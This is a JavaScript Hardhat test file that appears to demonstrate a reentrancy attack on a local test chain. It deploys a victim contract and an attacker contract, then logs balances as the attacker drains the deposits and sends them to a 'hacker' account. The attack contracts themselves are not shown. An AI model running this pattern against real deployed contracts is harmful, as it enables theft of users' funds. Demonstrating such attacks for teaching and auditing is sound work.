const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("Reentrancy Attack", function(){

    let owner, account1, account2, account3, hacker,
        ToAttack, toAttack, Attacker, attacker;


    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();

        ToAttack = await ethers.getContractFactory("ToAttack");
        toAttack = await ToAttack.deploy(owner.address);
        await toAttack.deployed();



        Attacker = await ethers.getContractFactory("Attacker");
        attacker = await Attacker.connect(hacker).deploy(hacker.address, toAttack.address);
        await attacker.deployed();
    });


    it("All the users should be able to deposit some ether to 'ToAttack' contract", async()=>{

        await toAttack.connect(account1).deposit({value: ethers.utils.parseEther("25")});
        await toAttack.connect(account2).deposit({value: ethers.utils.parseEther("50")});
        await toAttack.connect(account3).deposit({value: ethers.utils.parseEther("75")});

        let balanceAccount1 = await toAttack.balances(account1.address);
        let balanceAccount2 = await toAttack.balances(account2.address);
        let balanceAccount3 = await toAttack.balances(account3.address);

        console.log("Balance Account1 after deposit", (balanceAccount1/10**18).toString(), "ether");
        console.log("Balance Account2 after deposit", (balanceAccount2/10**18).toString(), "ether");
        console.log("Balance Account3 after deposit", (balanceAccount3/10**18).toString(), "ether");
        console.log("");
    });



    it("Exploit", async()=>{


        let balanceAttackerBefore = await toAttack.balances(attacker.address);
        console.log("Attacker balance before exploit", (balanceAttackerBefore/10**18).toString(), "ether");


        let balanceToAttackBefore = await ethers.provider.getBalance(toAttack.address);
        console.log("toAttack balance Before exploit", (balanceToAttackBefore/10**18).toString(), "ether");
        console.log("");

        await attacker.connect(hacker).exploit({value: ethers.utils.parseEther("2")});

        let balanceAttackerAfter = await ethers.provider.getBalance(attacker.address);
        console.log("Attacker balance after exploit", (balanceAttackerAfter/10**18).toString(), "ether");

        let balanceToAttackAfter = await ethers.provider.getBalance(toAttack.address);
        console.log("toAttack balance After exploit", (balanceToAttackAfter/10**18).toString(), "ether");
    });



    it("Send Ether steal to hacker", async()=>{
        let balanceHackerBefore = await ethers.provider.getBalance(hacker.address);
        console.log("Hacker balance before exploit", (balanceHackerBefore/10**18).toString(), "ether");

        await attacker.connect(hacker).withdrawAll();

        let balanceHackerAfter = await ethers.provider.getBalance(hacker.address);
        console.log("Hacker balance after exploit", (balanceHackerAfter/10**18).toString(), "ether");
    });


})